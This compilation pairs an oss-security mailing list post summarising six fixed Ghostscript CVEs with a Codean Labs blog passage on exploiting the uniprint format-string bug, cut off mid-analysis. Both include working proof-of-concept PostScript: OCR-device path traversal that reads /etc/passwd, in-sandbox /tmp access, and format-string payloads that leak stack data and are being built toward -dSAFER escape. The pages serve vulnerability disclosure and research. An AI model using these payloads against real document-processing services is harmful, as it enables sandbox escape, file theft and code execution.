=== Content from www.openwall.com_0ce9684e_20250110_172541.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](6) [[next>]](8) [[<thread-prev]](../../../2024/06/28/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <57c462dd-f23a-4f55-a870-55c6886767a0@codean.io>
Date: Wed, 3 Jul 2024 16:07:37 +0200
From: Thomas Rinsma <thomas@...ean.io>
To: oss-security@...ts.openwall.com
Subject: Re: Ghostscript 10.03.1 (2024-05-02) fixed 5 CVEs including
 CVE-2024-33871 arbitrary code execution

Hi,

Per Solar's request, here is some information on recent Ghostscript
bugs. They have all been fixed upstream already for either ~1 month
(10.03.1) or ~4 months (10.03.0). It looks like patches have also landed
in most distros, but there is not a super clear changelog or version
history so this might help clarify things.

Note that this is just a subset of all vulnerabilities fixed in 10.03.0
and 10.03.1: these are just the bugs I myself found and reported.

# CVE-2024-29509 - heap buffer overflow via the PDFPassword parameter

The `runpdf` command (and friends) allows the new C-based PDF
interpreter to be invoked from within PS. With this, we can pass various
flags and arguments (see `pdf_impl_set_param`) that are normally passed
via the command-line when the PDF interpreter is invoked directly.

It turns out that validation of several of these parameters is flawed,
maybe because they were considered somewhat "trusted", being
command-line arguments originally.

The fields `ctx->encryption.Password` and `ctx->encryption.PasswordLen`
are set based on the value of `PDFPassword`. During the decryption
process, in `check_password_R5`  in `pdf_sec.c`, a buffer is allocated
based on the string-length of this field:

```
code = pdfi_object_alloc(ctx, PDF_STRING,
strlen(ctx->encryption.Password), (pdf_obj **)&P);
```

However, a `memcpy` later copies the full length of the PS-supplied
object into this buffer:

```
memcpy(P->data, Password, PasswordLen);
```

Because PS-strings are not null-terminated, this will result in a heap
buffer overflow when a value of `PDFPassword` is supplied with a null
byte in the middle. For example, the following will result in a `memcpy`
of 7 bytes into a buffer of size 3:

```
/PDFPassword (foo\000bar) def
```

This bug was fixed in 10.03.0 (2024-03-06), and is bug (1) in this
report: <https://bugs.ghostscript.com/show_bug.cgi?id=707510>

# CVE-2024-29506 - stack buffer overflow in pdfi_apply_filter()

The `PDFDEBUG` flag controls the value of `ctx->args.debug`. In
`pdfi_apply_filter` this enables execution of a `memcpy` into a stack
buffer, without bounds checks. The input (`n->data`, the PDF filter
name) is an attacker controlled buffer of arbitrary size. A filter name
larger than 100 will overflow the `str` buffer.

```
if (ctx->args.pdfdebug)
     {
         char str[100];
         memcpy(str, (const char *)n->data, n->length);
         str[n->length] = '\0';
         dmprintf1(ctx->memory, "FILTER NAME:%s\n", str);
     }
```

This bug was also fixed in 10.03.0 (2024-03-06), and is bug (2) in this
report: <https://bugs.ghostscript.com/show_bug.cgi?id=707510>

# CVE-2024-29507 - stack buffer overflow via CIDFSubstPath/Font params

Under specific conditions, the `cidfsubstpath` and `cidfsubstfont`
parameters (set by corresponding Postscript objects) are used to load
substitute fonts (this is in `pdfi_open_CIDFont_substitute_file`). The
values are `memcpy`d into the `fontfname` buffer without bounds checks.
Hence, an attacker can pass values larger than the buffer size to
trigger a stack buffer overflow.

```
char fontfname[gp_file_name_sizeof]; // 4096

// .. <snip> ...

if (ctx->args.cidfsubstpath.data == NULL) {
     memcpy(fontfname, fsprefix, fsprefixlen);
}
else {
     memcpy(fontfname, ctx->args.cidfsubstpath.data,
ctx->args.cidfsubstpath.size);
     fsprefixlen = ctx->args.cidfsubstpath.size;
}

if (ctx->args.cidfsubstfont.data == NULL) {
     // ... <snip> ...
}
else {
     memcpy(fontfname, ctx->args.cidfsubstfont.data,
ctx->args.cidfsubstfont.size);
     defcidfallacklen = ctx->args.cidfsubstfont.size;
}
```

This bug was also fixed in 10.03.0 (2024-03-06), and is bug (3) in this
report: <https://bugs.ghostscript.com/show_bug.cgi?id=707510>

# CVE-2024-29508 - heap pointer leak in pdf_base_font_alloc()

The function `pdf_base_font_alloc` used by the `pdfwrite` device will
use a hexadecimal pointer representation (`".F" PRI_INTPTR`) for the
constructed BaseFont name if the input name is empty:

```
if (pfname->size > 0) {
     font_name.data = pfname->chars;
     font_name.size = pfname->size;
     while (pdf_has_subset_prefix(font_name.data, font_name.size)) {
         /* Strip off an existing subset prefix. */
         font_name.data += SUBSET_PREFIX_SIZE;
         font_name.size -= SUBSET_PREFIX_SIZE;
     }
} else {
     gs_snprintf(fnbuf, sizeof(fnbuf), ".F" PRI_INTPTR, (intptr_t)copied);
     font_name.data = (byte *)fnbuf;
     font_name.size = strlen(fnbuf);
}
```

Resulting in, for example:

```
<</BaseFont/YZKFTQ+.F0x5618b147e378/FontDescriptor 8 0 R/ToUnicode 11 0
R/Type/Font ...
```

An attacker can obtain this pointer value by reading back the output
file (after writing to a temporary writable and readable location).

This bug (and various other pointer leaks) were fixed in 10.03.0
(2024-03-06), and is bug (4) in this report:
<https://bugs.ghostscript.com/show_bug.cgi?id=707510>

# CVE-2024-29511 - arbitrary file read/write through Tesseract config

The `ocr` family of devices invoke Tesseract to perform OCR operations.
The device parameter `OCRLanguage` is used by Tesseract to load a data
file for that specific language. Specifically, such a file is loaded
from `./<OCRLanguage>.traineddata`. By using a path traversal to
`/tmp/`, we can force Tesseract to load our own data file:

```
mark
/OutputFile (/tmp/notused)
/OCRLanguage (../../../../../tmp/test) % loads /tmp/test.traineddata
/OutputDevice /ocr
.dicttomark
setpagedevice
```

As it turns out, Tesseract `traineddata` files can include various
configuration values, including `user_patterns_file` which will try to
load patterns from the given path, and `debug_file` which will write
debug information to the given path. The debug information is quite
verbose, and will print full input lines if they don’t start with a
valid character in the trained language. By constructing our "language"
such that no character is valid, all lines in the pattern file are
printed. For example, the configuration settings:

```
debug_file /tmp/out
user_patterns_file /etc/passwd
```

will result in a file `/tmp/out` containing:

```
Error: failed to insert pattern 'root:x:0:0:root:/root:/bin/bash'
Error: failed to insert pattern
'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin'
Error: failed to insert pattern 'bin:x:2:2:bin:/bin:/usr/sbin/nologin'
Error: failed to insert pattern 'sys:x:3:3:sys:/dev:/usr/sbin/nologin'
Error: failed to insert pattern 'sync:x:4:65534:sync:/bin:/bin/sync'
<etc>
```

In Postscript we can:

1. Construct the traineddata file under `/tmp/`
2. Use path traversal in `OCRLanguage` to load it when initializing the
`ocr` device
3. Read the resulting output data in `/tmp/out`

This allows us to read arbitrary files outside of the SAFER sandbox, and
write to arbitrary file paths, although during writing, every line will
start with `Error: failed to insert pattern '` and end with `'`.

Note that this is the Tesseract/OCR-related bug that was referred to by
the Ghostscript changelog (and quoted earlier in this thread). Contrary
to what is stated in the changelog it does not lead to RCE by itself,
just file read/write. It also requires Ghostscript to be compiled with
Tesseract support.

# CVE-2024-29510 - format string injection in uniprint device

The `uniprint` device allows the user to provide various string
fragments as device options, which are later appended to the output
file. Two of these parameters, `upWriteComponentCommands` and
`upYMoveCommand`, are actually treated as format strings, specifically
for `gp_fprintf` and `gs_snprintf`. For these, the intention is for the
user to include just one format specifier in the string, but there is no
logic preventing arbitrary format strings (with multiple specifiers)
from being used.

With full control over the format string (by setting a page device with
the respective options), and read access to the device output (by
setting it to a temporary file path), an attacker can abuse this to leak
data from the stack and perform memory corruption. This is specifically
impactful in the cases of `gs_snprintf` (as opposed to `gp_fprintf`), as
its format-string parsing logic is not hardened by compiler measures
like `D_FORTIFY_SOURCE`, while it still supports the `%n` modifier.

Bug report and public blog post with more details and PoC leading to a
SAFER sandbox bypass:

<https://bugs.ghostscript.com/show_bug.cgi?id=707662>
<https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/>

---

Cheers,
Thomas

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.vicarius.io_8160d4be_20250110_172542.html ===


 [about](/vsociety/about) [by vicarius](https://vicarius.io/) [log in](/vsociety/sign/in) [join community](/vsociety/sign/up)

* [scripts](/vsociety/posts)
* [CVEs](/vsociety/vulnerabilities)
* [apps](/vsociety/products)
* [OS](/vsociety/operating-systems)

 [by @alchemist](/vsociety/users/alchemist)06 Aug 2024020670#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Critical Vulnerability in Ghostscript (CVE-2024-29510)

 [by @alchemist](/vsociety/users/alchemist)02 [by @alchemist](/vsociety/users/alchemist)06 Aug 2024020670#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Critical Vulnerability in Ghostscript (CVE-2024-29510)

CVEs

[CVE-2024-29510](/vsociety/vulnerabilities/cve-2024-29510)6.3 Medium Severity
## PoC video

## Summary

CVE-2024-29510 is a critical remote code execution vulnerability in Ghostscript that allows attackers to execute arbitrary code via specially crafted PostScript files. The issue is mitigated by updating to Ghostscript version 10.03.1 or later, which includes fixes for the vulnerability.

## Description

Tags

[#RCE](/vsociety/search?hashtags=rce)[#exposed\_to\_RCE\_attack](/vsociety/search?hashtags=exposed_to_rce_attack)[#ghostscript](/vsociety/search?hashtags=ghostscript)[#cve-analysis](/vsociety/search?hashtags=cve-analysis)[#CVE-2024-29510](/vsociety/search?hashtags=cve-2024-29510)[![users/photos/clm4pm8ebnpz71gn2efjy7ime.jpg](data:image/svg+xml;charset=UTF-8...)](/vsociety/users/alchemist)[@alchemist](/vsociety/users/alchemist)

70 posts

working on it.

subscribe to user

Total vcoins

29.1K

Social media links

Pathik Gohil

show more

 remediate more CVEs with vRx  [explore more](https://www.vicarius.io/?utm_source=vsociety&utm_medium=organic&utm_campaign=cve_scripts%26analysis) Comments (0)submitshow 5 more replies[![users/photos/clm4pm8ebnpz71gn2efjy7ime.jpg](data:image/svg+xml;charset=UTF-8...)](/vsociety/users/alchemist)[@alchemist](/vsociety/users/alchemist)

70 posts

working on it.

subscribe to user

Total vcoins

29.1K

Share

Social media links

Pathik Gohil

show more

CVEs

[CVE-2024-29510](/vsociety/vulnerabilities/cve-2024-29510)6.3 Medium Severity

Tags

[#RCE](/vsociety/search?hashtags=rce)[#exposed\_to\_RCE\_attack](/vsociety/search?hashtags=exposed_to_rce_attack)[#ghostscript](/vsociety/search?hashtags=ghostscript)[#cve-analysis](/vsociety/search?hashtags=cve-analysis)[#CVE-2024-29510](/vsociety/search?hashtags=cve-2024-29510)

Democratizing infosec research for a more secure society. Be a part of the movement.

##### about

* [An Origin Story: vsociety](/vsociety/posts/an-origin-story-vsociety)
* [Frequently Asked Questions](/vsociety/faq)
##### be Part

* [Join Community](/vsociety/sign/up)
* [Login](/vsociety/sign/in)
##### legal

* [Privacy Policy](/vsociety/privacy-policy)
* [Terms of Use](/vsociety/terms)

Copyright © Vicarius 2022. [Privacy Policy](https://www.vicarius.io/privacy) and [Terms of Use](/vsociety/terms)



=== Content from codeanlabs.com_090309bd_20250110_172540.html ===


Close

[xml version="1.0" encoding="UTF-8" standalone="no"?](/)

* [Services](https://codeanlabs.com/services/)
* [Pricing](https://codeanlabs.com/pricing/)
* [Blog](https://codeanlabs.com/blog/)
* [About](https://codeanlabs.com/about/)
* [Jobs](https://codeanlabs.com/jobs/)

[Schedule a meeting](https://calendar.google.com/calendar/appointments/schedules/AcZssZ30zahGVLL7gAWd_jNKsOMudLtoZYwzyVQChrc8StEfD-FbT15fNylYv4ybJN3xT_raaEL_n7uE?gv=true)
[Need a pentest?](https://codeanlabs.com/pentest/)

Get in touch
[[email protected]](/cdn-cgi/l/email-protection#95fdf0f9f9fad5f6faf1f0f4fbf9f4f7e6bbf6faf8)
+31 (0)30 899 3984

[Schedule a meeting](https://calendar.google.com/calendar/appointments/schedules/AcZssZ30zahGVLL7gAWd_jNKsOMudLtoZYwzyVQChrc8StEfD-FbT15fNylYv4ybJN3xT_raaEL_n7uE?gv=true)
[Need a pentest?](https://codeanlabs.com/pentest/)

[Research](https://codeanlabs.com/blog/category/research/)
Thomas Rinsma
07-02-2024
# CVE-2024-29510 – Exploiting Ghostscript using format strings

![](https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png)
Share article

### TL;DR

This is a write-up for CVE-2024-29510, a format string vulnerability in Ghostscript ≤ 10.03.0 (but ≥ 9.50). We show how this can be exploited to bypass the `-dSAFER` sandbox and gain code execution.

This vulnerability has significant impact on web-applications and other services offering document conversion and preview functionalities as these often use Ghostscript under the hood. We recommend verifying whether your solution (indirectly) makes use of Ghostscript and if so, update it to the latest version.

*This is part one of a three-part series on Ghostscript vulnerabilities found by Codean Labs.*

* *[Part two](https://codeanlabs.com/blog/research/cve-2024-29511-abusing-ghostscripts-ocr-device/) covers CVE-2024-29511, a partial sandbox escape leading to an arbitrary file read/write.*
* *[Part three](https://codeanlabs.com/blog/research/ghostscript-wrap-up-overflowing-buffers/) covers CVE-2024-29506, CVE-2024-29507, CVE-2024-29508, and CVE-2024-29509, a set of memory-corruption-related vulnerabilities.*
## Introduction

Ghostscript, first released in 1988 (!), is a Postscript interpreter and a general document conversion toolkit. While originally being a relatively obscure UNIX tool used for talking to printers, it has nowadays found common usage in automated systems where it is used to process user-supplied files.

Specifically, many web applications which handle and convert images or documents will at some point call into Ghostscript. Often indirectly via tools like ImageMagick and LibreOffice. Think of the attachment preview images you see in chat programs and cloud storage applications; in the conversion and rendering logic behind those, there is often an invocation of Ghostscript!

The increase of these automated conversion workflows has pushed Ghostscript developers to implement various sandboxing functionalities and to harden them over time. In recent versions, the `-dSAFER` sandbox is enabled by default, and blocks or limits all kinds of dangerous operations such as file I/O and command execution which would normally be possible in Postscript.

From a security perspective this is of course very interesting. We have a wide attack surface (user-supplied input files and lots of functionality to explore) and a clear goal (escaping the sandbox, leading to Remote Code Execution (RCE)).

It is good to remember that Postscript is a well-featured Turing-complete programming language. A bit like TeX, but arguably more general-purpose. Its support for file I/O for example enables one to write document-related conversion and extraction tools in Postscript. From that point-of-view, the ability to execute commands using a pipe (by prefixing a file-open path with `|` or `%pipe%`) is just as normal as it is in Perl or Bash.

All of this puts Ghostscript in an odd place where it wants to allow all these legacy use-cases, but it is also commonly being used as a conversion tool on untrusted files, which are often treated more as static graphic descriptions rather than as programs.

## Playing in the sandbox

The `-dSAFER` sandbox mainly revolves around restricting I/O operations. When enabled, it disallows the `%pipe%` functionality that would otherwise allow for command execution (e.g., by opening the file `%pipe%uname -a`), and it restricts file access to a whitelisted set of paths. In a default install, this list includes some Ghostscript-internal paths for things like fonts, and the `/tmp/` directory (at least on Linux).

Postscript is a stack-based language, which makes it a bit hard to read if you’re not used to it. The code of a Postscript program is in essense a big list of things which are pushed one-by-one on the execution stack. When an operator is encountered, one or more elements of this stack may be consumed, and one or more new ones may be pushed. This is analogous to calculators with reverse-Polish-notation, for example:

```

3 4 add =       % prints "7"
3 4 mul 2 add = % prints "14"

```

More complicated logic requires some stack “juggling”: operators like `pop`, `dup` and `exch` copy and move things around on the stack.

Postscript has standard types like booleans and numbers, but also strings (`(foobar)`) (note the parentheses as opposed to quotes), lists (`[ 1 2 3 ]`), dicts (`<< /Key (value) /Foo (bar) /Baz 42 >>`) and procedures (`{ (Hello world!) = }`). Those slash-prefixed dictionary keys are *names*. They can also be defined on the global scope (that’s also a dictionary!) using `def`. You can then dereference them without the slash:

```

/MyVariable (Hello world!) def
MyVariable = % prints "Hello world!"

```

Names can also refer to procedures. In this article we’ll mostly use `CamelCase` for variables and `snake_case` for user-defined procedures.

The fact that `/tmp/` is fully accessible is quite interesting, as it means that even in a sandboxed environment, a Postscript program can list, read and write anything under `/tmp/`:

```

% List all files under /tmp/
(/tmp/*) { = } 1024 string filenameforall

% Read and print contents of /tmp/foobar
(/tmp/foobar) (r) file 1024 string readstring pop =

% Write to a (new) file
(/tmp/newfile) (w) file dup (Hello world!) writestring closefile

```

In certain integrated usages of Ghostscript this could already be dangerous, as temporary sensitive data or configurations could be stored in `/tmp/`. Or other people’s uploaded content could be present there.

The ability to read and write files becomes even more interesting from an attacker’s perspective when combined with the ability to change the output device and its settings. The non-sandboxed `setpagedevice` operator receives a dictionary with device parameters, including the device name itself. These are equivalent to the fields you’d often specify on the command-line, including the output filepath. It’s therefore possible to render a page with an arbitrary device and read back the generated output file, all from within the same execution, independent of the originally set device parameters.

```

% simple_stroke.ps

% Change the current output file and page device (e.g., pdfwrite)
<<
	/OutputFile (/tmp/foobar)
	/OutputDevice /pdfwrite
>>
setpagedevice

% Some minimal graphical content (a single diagonal stroke)
newpath
100 600 moveto
200 400 lineto
5 setlinewidth
stroke

% Produce a page
showpage

% Read back the contents of the output file
(/tmp/foobar) (r) file 8000 string readstring pop
print

```

After showpage is invoked, the device has written out the data corresponding to the content of the page. Hence, we can immediately read this back, in this case printing it to stdout using print:

```

$ ghostscript -q -dSAFER -dBATCH -dNODISPLAY simple_stroke.ps
%PDF-1.7
%
%%Invocation: ghostscript -q -dSAFER -dBATCH -dNODISPLAY ?
5 0 obj
<</Length 6 0 R/Filter /FlateDecode>>
stream
x+T03T0A(˥d^ejPeeeh```"r@

e

```

The partial binary PDF stream at the end encodes the line we’ve drawn. If we let the program finish, Ghostscript will close the page device which nicely wraps up the output file `/tmp/foobar`, in this case a valid PDF with an xref table and everything:

![](https://codeanlabs.com/wp-content/uploads/2024/04/screenshot_evince_foobar.png)

The file “foobar.pdf” as rendered by a PDF reader.

## Too universal

Ghostscript implements dozens of different output devices, as listed in its `--help` output. A device is just some logic that produces output data. This ranges from `x11alpha` which shows a window (on Linux) to e.g. `jpegcmyk` which produces a JPEG file. Similarly, several document types are supported (e.g., XPS, EPS, PDF), but also many variants of printer command languages (e.g., PJL, PCL, epson, deskjet). Devices can be configured and selected (usually with `-sDEVICE=` on the command-line, but also via `setpagedevice` from within Postscript as we saw before). Configurable parameters vary by device, but standard ones include the output file, the page format, margins, color profiles, etc.

Ghostscript is very configurable via the command-line. With the `-d` and `-s` prefixes it is possible to set booleans and named fields which are used by the startup logic to configure the device. Some common usecases include:
```

# Read a file from stdin, and output it as PNG to stdout
# (e.g., how LibreOffice invokes Ghostscript to render embedded EPS files)
ghostscript -q -dBATCH -dNOPAUSE -sDEVICE=pngalpha -sOutputFile=- -

# Extract pages 3-5 from in.pdf into out.pdf
ghostscript -dNOPAUSE -dQUIET -dBATCH -sOutputFile=out.pdf -dFirstPage=3 -dLastPage=5 -sDEVICE=pdfwrite in.pdf

# Determine the bounding box of an EPS file
ghostscript -q -dBATCH -dNOPAUSE -sDEVICE=bbox -sOutputFile=- img.eps

```

One interesting device is `uniprint`, the “universal printer device”. It is particularly versatile as it can be used to generate command data for different brands and models of printers, just by changing the device’s configuration parameters. Ghostscript ships with a set of `.upp` files which are just Ghostscript command-lines (notice `-dSAFER` and `-sDEVICE=uniprint` for example) with pre-filled parameters for specific printers, e.g. `cdj550.upp`:

```

-supModel="HP Deskjet 550c, 300x300DpI, Gamma=2"
-sDEVICE=uniprint
-dNOPAUSE
-P- -dSAFER
-dupColorModel=/DeviceCMYK
-dupRendering=/ErrorDiffusion
-dupOutputFormat=/Pcl
-r300x300
-dupMargins="{ 12.0 36.0 12.0 12.0}"
-dupBlackTransfer="{
     0.0000 0.0010 0.0042 0.0094 0.0166 0.0260 0.0375 0.0510
     0.0666 0.0843 0.1041 0.1259 0.1498 0.1758 0.2039 0.2341
     0.2663 0.3007 0.3371 0.3756 0.4162 0.4589 0.5036 0.5505
     0.5994 0.6504 0.7034 0.7586 0.8158 0.8751 0.9365 1.0000
}"
-dupCyanTransfer="{
     0.0000 0.0010 0.0042 0.0094 0.0166 0.0260 0.0375 0.0510
     0.0666 0.0843 0.1041 0.1259 0.1498 0.1758 0.2039 0.2341
     0.2663 0.3007 0.3371 0.3756 0.4162 0.4589 0.5036 0.5505
     0.5994 0.6504 0.7034 0.7586 0.8158 0.8751 0.9365 1.0000
}"
-dupMagentaTransfer="{
     0.0000 0.0010 0.0042 0.0094 0.0166 0.0260 0.0375 0.0510
     0.0666 0.0843 0.1041 0.1259 0.1498 0.1758 0.2039 0.2341
     0.2663 0.3007 0.3371 0.3756 0.4162 0.4589 0.5036 0.5505
     0.5994 0.6504 0.7034 0.7586 0.8158 0.8751 0.9365 1.0000
}"
-dupYellowTransfer="{
     0.0000 0.0010 0.0042 0.0094 0.0166 0.0260 0.0375 0.0510
     0.0666 0.0843 0.1041 0.1259 0.1498 0.1758 0.2039 0.2341
     0.2663 0.3007 0.3371 0.3756 0.4162 0.4589 0.5036 0.5505
     0.5994 0.6504 0.7034 0.7586 0.8158 0.8751 0.9365 1.0000
}"
-dupBeginPageCommand="<
   1b2a726243
   1b2a7433303052
   1b266c33616f6c45
   1b2a6f31643251
   1b2a703059
   1b2a72732d34753041
   1b2a62326d
>"
-dupAdjustPageWidthCommand
-dupEndPageCommand="(0M\033*rbC\033E\033&l0H)"
-dupAbortCommand="(0M\033*rbC\033E\15\12\12\12\12    Printout-Aborted\15\033&l0H)"
-dupYMoveCommand="(%dy\0)"
-dupWriteComponentCommands="{ (%dv\0) (%dv\0) (%dv\0) (%dw\0) }"

```

If you look carefully at the last couple of parameters, you’ll notice that `upYMoveCommand` and `upWriteComponentCommands` contain format-string specifiers. Specifically, `%d` is used to incorporate an integer parameter at a chosen position. Presumably this is needed for versatility across the different printer dialects.

Looking at the codebase confirms that these parameters are indeed used as format strings as-is, but only in case of the `\Pcl` output format (uniprint supports several types of output formats). In case of `upOutputFormat == \Pcl`, the function `upd_wrtrtl` is used for rendering. Inside that function, the contents of `upYMoveCommand` (copied to `upd->strings[S_YMOVE]` during device initialization) is used as a format string for the function `gs_snprintf`, with a calculated “Y position” being passed as a variadic argument:

```

      /*
       *    Adjust the Printers Y-Position
       */
      if(upd->yscan != upd->yprinter) { /* Adjust Y-Position */
         if(1 < upd->strings[S_YMOVE].size) {
           gs_snprintf((char *)upd->outbuf+ioutbuf, upd->noutbuf-ioutbuf,
             (const char *) upd->strings[S_YMOVE].data,
             upd->yscan - upd->yprinter);
           ioutbuf += strlen((char *)upd->outbuf+ioutbuf);
         } else {
		       <snip>
	       }
       }

```

If you’re familiar with format string exploits you’ll now what comes next!

## A proof of concept

As these parameters are just regular device parameters, we can use `setpagedevice` to change the device to `uniprint`, just like we did with `pdfwrite` before. It is then simple to pass arbitrary values for the various `upXXXX` parameters, just by setting them in the dictionary passed to `setpagedevice`.

As for the two parameters with format strings, it appears that `upYMoveCommand` is nicest to play with as it is just a single string which is formatted only once if you render a simple page. It looks like this command is used to tell a printer to move the print head to a specific Y position before printing whatever follows. But for this attack it doesn’t really matter what the intended purpose is.

So, let’s try with a simple proof of concept. We take our previous PDF example where we write to `/tmp/foobar` and read it back, but replace the `setpagedevice` invocation with the following:

```

% Change the page device to `uniprint`, setting its output file and other params
<<
	/OutputFile (/tmp/foobar)
	/OutputDevice /uniprint

	% Required uniprint parameters to reach the `upd_wrtrtl(...)` variant
	/upColorModel /DeviceCMYKgenerate
	/upRendering /FSCMYK32
	/upOutputFormat /Pcl

	% Set our testing payload
	/upYMoveCommand (1:%x\n2:%x\n3:%x\n4:%x\n5:%x\n6:%x\n7:%x\n8:%x\n)

	% Set some of the other string parameters
	/upBeginJobCommand (Hello job!\n)
	/upBeginPageCommand (Hello page!\n)

	% empty strings to reduce spam
	/upWriteComponentCommands {(\0) (\0) (\0) (\0)}
>>
setpagedevice

```

This gives us a string like this from the output (which was read back from `/tmp/foobar`):

```

Hello job!
Hello page!
1:be
2:be
3:5fd58000
4:5fd580f0
5:5fc36460
6:fffffff0
7:e48f1300
8:60005718
A?????????????????????????

```

In between other `uniprint` output (most of which is actually non-ascii data representing the stroke we drew) we find our formatted string, including the values of the first 8 words on the stack! Basically, the implementation of `gs_snprintf` blindly reads a “parameter” from the stack for every given format specifier, assuming these were passed as variadic arguments. But because in this case these parameters were not actually supplied (only one integer is given), it reads from locations further down the stack.

Using this technique, we can read the contents of the stack at arbitrary offsets from the current stack pointer, all the way down to the contents of `argv` and `envp` (pushed before `main` is called). This by itself is already useful, as it leaks environment variables and various pointers that could be useful for bypassing ASLR in other exploits. On systems where it is enabled, this also leaks the stack cookie value which can be useful for exploiting stack buffer overflows.

However, we can do more than just print stack values. If we can somehow control a pointer somewhere on the stack, we can use `%s` to dereference it. While `%s` stops reading at null-bytes, this is not a problem: if we know we want to read N bytes, we can use `%.Ns` (e.g., `%.8s`). If we then get back less than N characters (say M), then we know that a null-byte must have followed and we recurse by reading (N – M – 1) bytes from (address + M + 1), until all bytes are read. With N=8, this technique can be used to extract a full pointer stored at a specified address, even if it happens to contain a null-byte.

Similarly — and this is usually the crux of format string attacks — if we can control a value on the stack, we can instead use `%n` to *write* to it. This is a relatively obscure and unique specifier which writes the number of characters printed up to that point, to a given pointer argument. A simple example with `printf`:

```

int n;
printf("Hello%n world!", &n);
// n == 5;

```

In our scenario there are limitations on the length of the format string, hence we can’t write arbitrarily high values with this (we would need to supply a very long string for high values). We can however use `%hn` to write an arbitrary 2-byte short to a memory address on the stack, just by putting up to 2^16 bytes of padding data in the format string.

Fun fact: `gs_snprintf` invokes `apr_vformatter`, which is a custom `printf`-style formatter that ships with Ghostscript. This means that the libc-provided formatter (regular `snprintf`) is not used in this case, which is beneficial for our attack as that one is often compiled with countermeasures against format string attacks!

## Arbitrary read/write?

So we can read from and write to pointers that happen to be on the stack, but what about an arbitrary read/write? In textbook format string attacks the format string itself is often located on the stack, providing an easy to control buffer to put an address in:

```

/* fmt.c */
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char fmt[256];
    strncpy(fmt, argv[1], sizeof(fmt));
    printf(fmt);
}

```
```

$ ./fmt 'AAAAAAAA_%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx'
AAAAAAAA_7fff98ccd540,7fff98ccca50,d,0,7c7a77bd2180,7fff98cccbf8,20,4141414141414141,786c252c786c255f

```

Notice the literal `4141414141414141` on the stack, coming from the start of the format string (`"AAAAAAAA"`). By replacing the corresponding `%lx` with `%n` the program will try to write a value to that address:

```

$ valgrind ./fmt 'AAAAAAAA_%lx,%lx,%lx,%lx,%lx,%lx,%lx,%n,%lx'
...
==671567== Invalid write of size 4
==671567==    at 0x48E2BA1: __printf_buffer (vfprintf-process-arg.c:348)
==671567==    by 0x48E36E0: __vfprintf_internal (vfprintf-internal.c:1523)
==671567==    by 0x48D886E: printf (printf.c:33)
==671567==    by 0x1091EC: main (in fmt)
==671567==  Address 0x4141414141414141 is not stack'd, malloc'd or (recently) free'd
...

```

In our case it is sadly not this simple. Our format string is located on the heap, hence we need to find a different value on the stack which we have full control over.

What values does the stack consist of? Well, it always contains the parameters and local variables of each function in the call-stack. Here is the call-stack at the invocation of `gs_snprintf`:

```

#0   upd_wrtrtl (upd=0x55555829c610, out=0x55555827fe50) at ./devices/gdevupd.c:6992
#1   upd_print_page (pdev=0x555558550068, out=0x55555827fe50) at ./devices/gdevupd.c:1161
#2   gx_default_print_page_copies (pdev=0x555558550068, prn_stream=0x55555827fe50, num_copies=0x1) at ./base/gdevprn.c:1160
#3   gdev_prn_output_page_aux (pdev=0x555558550068, num_copies=0x1, flush=0x1, seekable=0x0, bg_print_ok=0x0) at ./base/gdevprn.c:1062
#4   gdev_prn_output_page (pdev=0x555558550068, num_copies=0x1, flush=0x1) at ./base/gdevprn.c:1098
#5   default_subclass_output_page (dev=0x5555583c42e8, num_copies=0x1, flush=0x1) at ./base/gdevsclass.c:136
#6   gs_output_page (pgs=0x555558198490, num_copies=0x1, flush=0x1) at ./base/gsdevice.c:207
#7   zoutputpage (i_ctx_p=0x5555581981a8) at ./psi/zdevice.c:502
#8   do_call_operator (op_proc=0x55555646e9e8 <zoutputpage>, i_ctx_p=0x5555581981a8) at ./psi/interp.c:91
#9   interp (pi_ctx_p=0x555558164a50, pref=0x7fffffffd170, perror_object=0x7fffffffd4e0) at ./psi/interp.c:1375
